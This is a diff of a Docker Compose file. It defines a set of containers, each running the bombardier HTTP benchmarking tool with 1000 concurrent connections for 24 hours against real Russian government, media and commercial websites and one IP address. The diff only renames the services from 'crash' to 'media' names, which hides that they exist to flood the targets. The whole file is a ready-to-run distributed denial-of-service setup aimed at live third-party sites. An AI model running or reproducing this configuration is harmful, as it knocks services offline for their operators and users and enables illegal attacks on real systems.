@@ -1,60 +1,60 @@
 version: "3.9"
 services:
-        crash1:
+        media_1:
                 image: alpine/bombardier
                 command: "-c 1000 -t 2s -l -d 24h https://wikimapia.org/#lang=en&lat=50.584800&lon=30.489800&z=12&m=w&tag=516"
-        crash1:
+        media_2:
                 image: alpine/bombardier
                 command: "-c 1000 -t 2s -l -d 24h https://185.169.155.16"
-        crash2:
+        media_3:
                 image: alpine/bombardier
                 command: "-c 1000 -t 2s -l -d 24h https://cloud.rkn.gov.ru"
-        crash3:
+        media_4:
                 image: alpine/bombardier
                 command: "-c 1000 -t 2s -l -d 24h https://mvd.gov.ru"
-        crash4:
+        media_5:
                 image: alpine/bombardier
                 command: "-c 1000 -t 2s -l -d 24h https://pwd.wto.economy.gov.ru"
-        crash5:
+        media_6:
                 image: alpine/bombardier
                 command: "-c 1000 -t 2s -l -d 24h https://stroi.gov.ru"
-        crash6:
+        media_7:
                 image: alpine/bombardier
                 command: "-c 1000 -t 2s -l -d 24h https://ria.ru"
-        crash7:
+        media_8:
                 image: alpine/bombardier
                 command: "-c 1000 -t 2s -l -d 24h https://gazeta.ru"
-        crash8:
+        media_9:
                 image: alpine/bombardier
                 command: "-c 1000 -t 2s -l -d 24h https://kp.ru"
-        crash9:
+        media_10:
                 image: alpine/bombardier
                 command: "-c 1000 -t 2s -l -d 24h https://riafan.ru"
-        crash10:
+        media_11:
                 image: alpine/bombardier
                 command: "-c 1000 -t 2s -l -d 24h https://pikabu.ru"
-        crash11:
+        media_12:
                 image: alpine/bombardier
                 command: "-c 1000 -t 2s -l -d 24h https://kommersant.ru"
-        crash12:
+        media_13:
                 image: alpine/bombardier
                 command: "-c 1000 -t 2s -l -d 24h https://mk.ru"
-        crash13:
+        media_14:
                 image: alpine/bombardier
                 command: "-c 1000 -t 2s -l -d 24h https://yaplakal.com"
-        crash14:
+        media_15:
                 image: alpine/bombardier
                 command: "-c 1000 -t 2s -l -d 24h https://rbc.ru"
-        crash15:
+        media_16:
                 image: alpine/bombardier
                 command: "-c 1000 -t 2s -l -d 24h https://bezformata.com"
-        crash16:
+        media_17:
                 image: alpine/bombardier
                 command: "-c 1000 -t 2s -l -d 24h https://shop-rt.com"
-        crash17:
+        media_18:
                 image: alpine/bombardier
                 command: "-c 1000 -t 2s -l -d 24h https://mail.rkn.gov.ru"
-        crash18:
+        media_19:
                 image: alpine/bombardier
                 command: "-c 1000 -t 2s -l -d 24h https://mail.rkn.gov.ru"
 
